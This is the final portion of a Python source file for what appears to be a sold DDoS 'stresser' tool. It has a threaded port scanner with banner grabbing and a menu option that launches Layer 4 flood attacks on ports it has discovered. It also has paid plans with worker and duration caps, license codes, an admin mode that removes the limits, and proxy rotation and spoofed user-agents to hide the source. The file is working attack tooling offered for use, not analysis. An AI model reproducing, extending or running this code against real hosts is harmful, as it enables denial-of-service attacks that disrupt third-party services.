        print(f"  Duration: {elapsed:.1f}s")
        print(f"  Average PPS: {reqs/elapsed:.2f}")
    else:
        print(f"  Total Requests: {reqs:,}")
        print(f"  Total Errors: {errs:,}")
        print(f"  Duration: {elapsed:.1f}s")
        print(f"  Average RPS: {reqs/elapsed:.2f}")
    
    input(f"\n  Press ENTER to return...")

# ================== RECONNAISSANCE ==================
def scan_port(target_ip, port, timeout=1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    result = sock.connect_ex((target_ip, port))
    sock.close()
    return result == 0

def threaded_port_scan(target_ip, ports, timeout=1, max_threads=100):
    open_ports = []
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        future_to_port = {executor.submit(scan_port, target_ip, port, timeout): port for port in ports}
        for future in as_completed(future_to_port):
            port = future_to_port[future]
            if future.result():
                open_ports.append(port)
                print(f"  {current_color}[OPEN]{RESET} Port {port}")
    return sorted(open_ports)

def reconnaissance_menu(req_counter, err_counter, ports_hit_list, conn_counter):
    clear_screen()
    print(f"{current_color}{BOLD}╔══ RECONNAISSANCE ══╗{RESET}\n")
    print("  [1] Quick Port Scan (1-1000)")
    print("  [2] Custom Port Scan")
    print("  [3] Scan with Service Detection")
    print("  [4] Attack Discovered Ports")
    print("  [0] Back")
    print()
    choice = input(f"  {current_color}{BOLD}Select → {RESET}").strip()
    
    if choice == '1':
        target = input("  Target IP → ").strip()
        try:
            socket.inet_aton(target)
        except socket.error:
            print("  Invalid IP address.")
            input("  Press ENTER...")
            return
        print(f"\n  Scanning ports 1-1000 on {target}...")
        open_ports = threaded_port_scan(target, range(1, 1001))
        print(f"\n  Found {len(open_ports)} open ports: {open_ports}")
        input("  Press ENTER...")
    elif choice == '2':
        target = input("  Target IP → ").strip()
        try:
            socket.inet_aton(target)
        except socket.error:
            print("  Invalid IP address.")
            input("  Press ENTER...")
            return
        range_input = input("  Port range (e.g., 1-5000 or 80,443,8080) → ").strip()
        ports = []
        if '-' in range_input:
            start, end = map(int, range_input.split('-'))
            ports = list(range(start, end+1))
        elif ',' in range_input:
            ports = [int(p.strip()) for p in range_input.split(',')]
        else:
            ports = [int(range_input)]
        print(f"\n  Scanning {len(ports)} ports on {target}...")
        open_ports = threaded_port_scan(target, ports)
        print(f"\n  Found {len(open_ports)} open ports: {open_ports}")
        input("  Press ENTER...")
    elif choice == '3':
        target = input("  Target IP → ").strip()
        try:
            socket.inet_aton(target)
        except socket.error:
            print("  Invalid IP address.")
            input("  Press ENTER...")
            return
        range_input = input("  Port range (default 1-1000) → ").strip()
        if not range_input:
            ports = range(1, 1001)
        elif '-' in range_input:
            start, end = map(int, range_input.split('-'))
            ports = list(range(start, end+1))
        elif ',' in range_input:
            ports = [int(p.strip()) for p in range_input.split(',')]
        else:
            ports = [int(range_input)]
        print(f"\n  Scanning and grabbing banners on {target}...")
        open_ports = []
        common_services = {80: 'HTTP', 443: 'HTTPS', 22: 'SSH', 21: 'FTP', 25: 'SMTP', 3306: 'MySQL', 5432: 'PostgreSQL'}
        with ThreadPoolExecutor(max_workers=100) as executor:
            future_to_port = {executor.submit(scan_port, target, port, 1): port for port in ports}
            for future in as_completed(future_to_port):
                port = future_to_port[future]
                if future.result():
                    open_ports.append(port)
                    banner = common_services.get(port, 'unknown')
                    if port in [80, 443, 21, 22, 25, 110, 143, 993, 995]:
                        try:
                            s = socket.socket()
                            s.settimeout(2)
                            s.connect((target, port))
                            if port == 80:
                                s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                                banner = s.recv(1024).decode().split('\r\n')[0]
                            elif port == 21:
                                banner = s.recv(1024).decode().strip()
                            elif port == 22:
                                banner = s.recv(1024).decode().strip()
                            s.close()
                        except:
                            pass
                    print(f"  {current_color}[OPEN]{RESET} Port {port} - {banner}")
        print(f"\n  Found {len(open_ports)} open ports.")
        input("  Press ENTER...")
    elif choice == '4':
        target = input("  Target IP → ").strip()
        try:
            socket.inet_aton(target)
        except socket.error:
            print("  Invalid IP address.")
            input("  Press ENTER...")
            return
        ports_input = input("  Ports to attack (comma-separated) → ").strip()
        if not ports_input:
            return
        ports = [int(p.strip()) for p in ports_input.split(',')]
        print("\n  Available Layer 4 methods:")
        for idx, m in enumerate(LAYER4_METHODS, 1):
            print(f"  {idx}. {m}")
        method_choice = input("  Select method number → ").strip()
        try:
            method = LAYER4_METHODS[int(method_choice)-1]
        except:
            print("  Invalid choice.")
            input("  Press ENTER...")
            return
        if admin_mode:
            max_workers = ADMIN_WORKERS
            max_duration = ADMIN_DURATION
            plan_name = "ADMIN"
        else:
            plan_info = PLANS[current_license['plan']]
            max_workers = plan_info['workers']
            max_duration = plan_info['duration']
            plan_name = plan_info['name']
        try:
            workers = int(input(f"\n  Workers (max {max_workers}) → ") or 100)
            workers = min(workers, max_workers)
        except:
            workers = 100
        try:
            duration = int(input(f"  Duration (seconds, max {max_duration}) → ") or 60)
            duration = min(duration, max_duration)
        except:
            duration = 60
        
        stats_start_time = time.time()
        req_counter.value = 0
        err_counter.value = 0
        ports_hit_list[:] = []
        conn_counter.value = 0
        
        print(f"\n{current_color}{BOLD}Starting attack on {target} ports {ports}...{RESET}")
        end_time = time.time() + duration
        
        asyncio.run(run_layer4_attack(target, method, workers, duration, plan_name, req_counter, err_counter, ports_hit_list, conn_counter))
        input("  Press ENTER...")
    else:
        return

# ================== OTHER MENUS ==================
def test_config_screen():
    if admin_mode:
        print(f"{current_color}{BOLD}╔══ ADMIN METHODS ══╗{RESET}\n")
        print("  All methods are available:\n")
        for method in ALL_METHODS:
            desc = METHOD_DESCRIPTIONS.get(method, '')
            print(f"  • {method}")
            if desc:
                print(f"      {desc}")
        input(f"\n  Press ENTER...")
        return

    plan_info = PLANS[current_license['plan']]
    
    clear_screen()
    print(f"{current_color}{BOLD}╔══────☁︎────══╗{RESET}")
    print(f"\n{current_color}  Current Plan: {RESET}{plan_info['name']}")
    print(f"{current_color}  Max Workers: {RESET}{plan_info['workers']}")
    print(f"{current_color}  Max Duration: {RESET}{plan_info['duration']}s")
    print(f"\n{current_color}  Available Methods:{RESET}")
    for method in plan_info['methods']:
        desc = METHOD_DESCRIPTIONS.get(method, '')
        print(f"    • {method}")
        if desc:
            print(f"      {desc}")
    print(f"\n{current_color}  Features:{RESET}")
    print("    • Heavy Request flow")
    print("    • Strong connection flow")
    print("    • 500+ Powerful User-agents")
    print("    • 10+ Powerful methods") 
    print(f"{current_color}{BOLD}╚═══════════════════════════════╝{RESET}")
    input(f"\n  Press ENTER...")

def view_test_agents():
    clear_screen()
    print(f"{current_color}{BOLD}╔══────☁︎────══╗{RESET}\n")
    
    try:
        num_entries = int(input(f"  Number of agent entries to display → ") or 10)
        num_entries = min(num_entries, 100)
    except:
        num_entries = 10
    
    clear_screen()
    print(f"{current_color}{BOLD}╔══────☁︎────══╗{RESET}\n")
    print(f"  Showing {num_entries} Workers:\n")
    
    for i in range(num_entries):
        user_agent = get_random_user_agent()
        entry_num = random.randint(1, 100)
        
        if 'Mobile' in user_agent:
            device_display = 'Mobile'
        elif 'iPad' in user_agent:
            device_display = 'iPad'
        elif 'Android' in user_agent:
            device_display = 'Android'
        elif 'iPhone' in user_agent:
            device_display = 'iPhone'
        elif 'Linux' in user_agent:
            device_display = 'Linux'
        elif 'Windows' in user_agent:
            device_display = 'Windows'
        elif 'Mac' in user_agent:
            device_display = 'macOS'
        else:
            device_display = 'Unknown'
        
        print(f"{current_color}  [{entry_num}] {RESET}{device_display}")
        print(f"         {user_agent[:80]}...")
        print()
    
    print(f"{current_color}{BOLD}╚═══════════════════════════════╝{RESET}")
    input(f"\n  Press ENTER...")

def plan_and_license():
    global current_license
    
    if admin_mode:
        print(f"{current_color}{BOLD}╔══ ADMIN MODE ══╗{RESET}")
        print("\n  In admin mode, plan limits are overridden.")
        print(f"  Max workers: {ADMIN_WORKERS}")
        print(f"  Max duration: {ADMIN_DURATION}s")
        input(f"\n  Press ENTER...")
        return
    
    clear_screen()
    print(f"{current_color}{BOLD}╔══ PLAN MANAGEMENT ══╗{RESET}\n")
    
    plan_info = PLANS[current_license['plan']]
    days_left = (current_license['expires'] - datetime.now()).days
    
    print(f"{current_color}  Current:{RESET}")
    print(f"    Plan: {plan_info['name']}")
    print(f"    Expires: {current_license['expires'].strftime('%Y-%m-%d')} ({days_left} days left)")
    
    print(f"\n{current_color}{BOLD}  Available Plans:{RESET}\n")
    for plan_key, plan in PLANS.items():
        print(f"  • {plan['name']}")
        print(f"    Workers: {plan['workers']} | Duration: {plan['duration']}s")
        print(f"    Methods: {len(plan['methods'])}")
        print()
    
    print(f"{current_color}{BOLD}╚═══════════════════════════════╝{RESET}")
    
    change = input(f"\n  Enter code to change plan (or press ENTER to skip) → ").strip().lower()
    
    if change:
        found = False
        for plan_key, plan in PLANS.items():
            if change in plan['76034a9f5bef30b9dee701711d30bed6']:
                current_license['plan'] = plan_key
                current_license['code'] = change
                current_license['expires'] = datetime.now() + timedelta(days=365)
                print(f"\n  ✓ Plan activated: {plan['name']}")
                found = True
                time.sleep(2)
                break
        
        if not found:
            print(f"\n  ✗ Invalid code")
            time.sleep(2)
    
    input(f"\n  Press ENTER...")

def color_screen():
    global current_color, current_name

    clear_screen()
    print(f"{current_color}{BOLD}╔══ COLOR SCHEME SELECTOR ══╗{RESET}\n")
    for name, code in COLORS.items():
        print(f"  {code}█ {name.ljust(12)}{RESET}")
    print(f"\n{current_color}{BOLD}╚═══════════════════════════╝{RESET}")
    
    pick = input(f"\n  Enter color name → ").strip().lower()
    if pick in COLORS:
        current_color = COLORS[pick]
        current_name = pick.title()
        print(f"\n  Color changed to: {current_color}{current_name}{RESET}")
    else:
        print(f"\n  Color not found - keeping current.")

    input(f"\n  Press ENTER...")

def change_ascii_menu():
    global current_ascii
    
    clear_screen()
    print(f"{current_color}{BOLD}╔══ ASCII MENU SELECTOR ══╗{RESET}\n")
    
    menu_names = list(ASCII_MENUS.keys())
    for idx, name in enumerate(menu_names, 1):
        print(f"{current_color}  {idx}) {RESET}{name}")
    
    print(f"\n{current_color}{BOLD}╚═══════════════════════════╝{RESET}")
    
    try:
        choice = int(input(f"\n  Select ASCII menu (1-{len(menu_names)}) → "))
        if 1 <= choice <= len(menu_names):
            current_ascii = menu_names[choice - 1]
            print(f"\n  ✓ ASCII menu changed to: {current_ascii}")
            time.sleep(1.5)
        else:
            print(f"\n  Invalid selection")
            time.sleep(1)
    except:
        print(f"\n  Invalid input")
        time.sleep(1)

async def proxy_settings():
    global proxies_enabled, file_proxies_enabled, public_proxies_enabled
    clear_screen()
    print(f"{current_color}{BOLD}╔══ PROXY SETTINGS ══╗{RESET}\n")
    print(f"  Master switch: {'ON' if proxies_enabled else 'OFF'}")
    print(f"  File proxies (admin only): {'ENABLED' if file_proxies_enabled else 'DISABLED'} – {len(file_proxies)} loaded")
    print(f"  Public proxies: {'ENABLED' if public_proxies_enabled else 'DISABLED'} – {len(public_proxies)} available")
    print("\n  Options:")
    print("  [1] Toggle master proxy switch")
    print("  [2] Load proxies from file (Webshare) [ADMIN ONLY]")
    print("  [3] Toggle file proxies (admin only)")
    print("  [4] Toggle public proxy fetching")
    print("  [5] Refresh public proxies now")
    print("  [6] Clear all proxy lists")
    print("  [0] Back")
    print()
    choice = input(f"  {current_color}{BOLD}Select → {RESET}").strip()
    
    if choice == '1':
        proxies_enabled = not proxies_enabled
        print(f"  Master proxy switch now {'ON' if proxies_enabled else 'OFF'}.")
        time.sleep(1)
    elif choice == '2':
        if not admin_mode:
            print("  Only admin can load file proxies.")
            time.sleep(2)
            return
        file = input("  Proxy file path (default: proxies.txt) → ").strip() or "proxies.txt"
        load_file_proxies(file)
        time.sleep(2)
    elif choice == '3':
        if not admin_mode:
            print("  Only admin can toggle file proxies.")
            time.sleep(2)
            return
        file_proxies_enabled = not file_proxies_enabled
        print(f"  File proxies now {'ENABLED' if file_proxies_enabled else 'DISABLED'}.")
        time.sleep(1)
    elif choice == '4':
        public_proxies_enabled = not public_proxies_enabled
        print(f"  Public proxy fetching now {'ENABLED' if public_proxies_enabled else 'DISABLED'}.")
        if public_proxies_enabled:
            asyncio.create_task(refresh_public_proxies(force=True))
        time.sleep(1)
    elif choice == '5':
        if public_proxies_enabled:
            asyncio.create_task(refresh_public_proxies(force=True))
            print("  Public proxy refresh started in background.")
        else:
            print("  Public proxy fetching is disabled. Enable it first.")
        time.sleep(2)
    elif choice == '6':
        async with proxy_lock:
            file_proxies.clear()
            public_proxies.clear()
        print("  All proxy lists cleared.")
        time.sleep(1)
    else:
        return

def admin_login():
    global admin_mode
    clear_screen()
    print(f"{current_color}{BOLD}╔══ ADMIN PANEL ══╗{RESET}\n")
    if admin_mode:
        print("  You are already in admin mode.")
        logout = input("  Logout? (y/n) → ").strip().lower()
        if logout in ['y', 'yes']:
            admin_mode = False
            # Optionally disable file proxies on logout
            file_proxies_enabled = False
            print("  Logged out.")
        else:
            print("  Staying in admin mode.")
        time.sleep(1)
        return
    pwd = input("  Enter admin password → ").strip()
    if pwd == ADMIN_PASSWORD:
        admin_mode = True
        print(f"\n  {current_color}✓ Admin mode activated!{RESET}")
        print(f"  Workers: {ADMIN_WORKERS} | Duration: {ADMIN_DURATION}s")
        print("  All methods unlocked.")
    else:
        print("\n  ✗ Incorrect password.")
    time.sleep(2)

def main():
    # Force fork start method to avoid spawn issues on macOS
    mp.set_start_method('fork', force=True)
    manager = mp.Manager()
    
    req_counter = manager.Value('i', 0)
    err_counter = manager.Value('i', 0)
    status_dict = manager.dict()
    latency_list = manager.list()
    ports_hit_list = manager.list()
    conn_counter = manager.Value('i', 0)
    
    # Increase file descriptor limit
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except:
        pass

    while True:
        header()
        choice = input(f"  {current_color}{BOLD}Select → {RESET}").strip()

        if choice in ["0", "q", "exit"]:
            print(f"\n{current_color}Session ended.{RESET}\n")
            break
        elif choice == "1":
            asyncio.run(run_load_test(req_counter, err_counter, status_dict, latency_list, ports_hit_list, conn_counter))
        elif choice == "2":
            test_config_screen()
        elif choice == "3":
            color_screen()
        elif choice == "4":
            view_test_agents()
        elif choice == "5":
            plan_and_license()
        elif choice == "6":
            change_ascii_menu()
        elif choice == "7":
            clear_screen()
            print(f"\033[2J\033[H")
            time.sleep(0.3)
        elif choice == "8":
            asyncio.run(proxy_settings())
        elif choice == "9":
            admin_login()
        elif choice == "10":
            reconnaissance_menu(req_counter, err_counter, ports_hit_list, conn_counter)
        else:
            print(f"  Invalid selection.")
            time.sleep(1)

if __name__ == "__main__":
    main()
